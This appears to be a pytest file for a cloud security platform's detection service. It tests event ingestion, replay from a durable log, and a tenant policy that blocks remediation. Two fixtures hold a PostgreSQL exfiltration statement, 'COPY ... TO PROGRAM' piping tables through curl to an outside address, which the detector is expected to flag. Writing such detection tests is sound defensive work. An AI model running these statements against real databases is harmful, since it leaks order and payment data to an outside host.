from pathlib import Path

from cloud_platform.models import RemediationExecutionRequest, TelemetryEnvelope, TenantResponsePolicy
from cloud_platform.persistence import StreamEventLog
from cloud_platform.repository import PlatformRepository
from cloud_platform.service import CloudPlatformService
from cloud_platform.tenant_policy import TenantPolicyRegistry


def test_service_replay_retains_stream_state(tmp_path: Path) -> None:
    service = CloudPlatformService(
        repository=PlatformRepository(event_log=StreamEventLog(tmp_path / "replay-events.jsonl"))
    )
    payload = TelemetryEnvelope.model_validate(
        {
            "tenant_id": "tenant-b",
            "source": "unit-test",
            "events": [
                {
                    "event_id": "app-1",
                    "kind": "application_log",
                    "timestamp": "2026-03-15T10:10:00Z",
                    "actor": {"user": "svc-auth", "ip": "10.0.0.9"},
                    "workload": {"cluster": "prod", "namespace": "auth", "pod": "auth-77", "container": "web"},
                    "application": {"service": "auth-api", "level": "ERROR", "message": "unexpected outbound connection"},
                    "attributes": {"trace_id": "trace-1"}
                }
            ]
        }
    )

    ingest_response = service.ingest(payload)
    replay_response = service.replay()

    assert ingest_response.ingested_events == 1
    assert replay_response.replayed_events == 1


def test_service_restores_stream_from_durable_log(tmp_path: Path) -> None:
    repository = PlatformRepository(event_log=StreamEventLog(tmp_path / "events.jsonl"))
    writer = CloudPlatformService(repository=repository)

    payload = TelemetryEnvelope.model_validate(
        {
            "tenant_id": "tenant-c",
            "source": "durability-test",
            "events": [
                {
                    "event_id": "db-2",
                    "kind": "database_query",
                    "timestamp": "2026-03-15T10:20:00Z",
                    "actor": {"user": "svc-orders", "ip": "10.0.0.11"},
                    "workload": {"cluster": "prod", "namespace": "orders", "pod": "orders-89", "container": "web"},
                    "database": {
                        "engine": "postgres",
                        "name": "orders",
                        "session_id": "pg-999",
                        "statement": "COPY orders TO PROGRAM 'curl http://203.0.113.20/out'",
                        "rows_returned": 9000
                    },
                    "attributes": {"bytes_sent": 2200000}
                }
            ]
        }
    )

    writer.ingest(payload)

    restored_repository = PlatformRepository(event_log=StreamEventLog(tmp_path / "events.jsonl"))
    restored_service = CloudPlatformService(repository=restored_repository)

    assert len(restored_service.list_stream()) == 1
    assert restored_service.replay().replayed_events == 1
    assert any(item.severity == "critical" for item in restored_service.list_detections())


def test_service_selector_policy_blocks_remediation_for_non_matching_workload(tmp_path: Path) -> None:
    repository = PlatformRepository(event_log=StreamEventLog(tmp_path / "selector-events.jsonl"))
    service = CloudPlatformService(
        repository=repository,
        policy_registry=TenantPolicyRegistry(
            policies={
                "tenant-d": TenantResponsePolicy(
                    tenant_id="tenant-d",
                    allowed_actions=["snapshot_forensics", "block_egress"],
                    selector_expressions=["service_account=payments-api", "label.team=security"],
                    selector_mode="all",
                )
            }
        ),
    )

    payload = TelemetryEnvelope.model_validate(
        {
            "tenant_id": "tenant-d",
            "source": "selector-test",
            "events": [
                {
                    "event_id": "db-3",
                    "kind": "database_query",
                    "timestamp": "2026-03-15T10:30:00Z",
                    "actor": {"user": "svc-payments", "ip": "10.0.0.12"},
                    "workload": {
                        "cluster": "prod",
                        "namespace": "payments",
                        "pod": "api-99",
                        "container": "web",
                        "service_account": "payments-api",
                        "labels": {"app": "payments-api"},
                    },
                    "database": {
                        "engine": "postgres",
                        "name": "payments",
                        "session_id": "pg-2000",
                        "statement": "COPY payments TO PROGRAM 'curl http://203.0.113.30/out'",
                        "rows_returned": 9500,
                    },
                    "attributes": {"bytes_sent": 2400000},
                }
            ],
        }
    )

    response = service.ingest(payload)
    detection_id = next(item.detection_id for item in response.detections if item.tenant_id == "tenant-d")

    remediation_plan = service.remediation_plan(detection_id)
    execution = service.execute_remediation(
        RemediationExecutionRequest(detection_id=detection_id, approved=True, dry_run=True)
    )

    assert remediation_plan.actions == []
    assert any("selector_policy" in reason for reason in remediation_plan.blocked_actions)
    assert execution.status == "blocked"
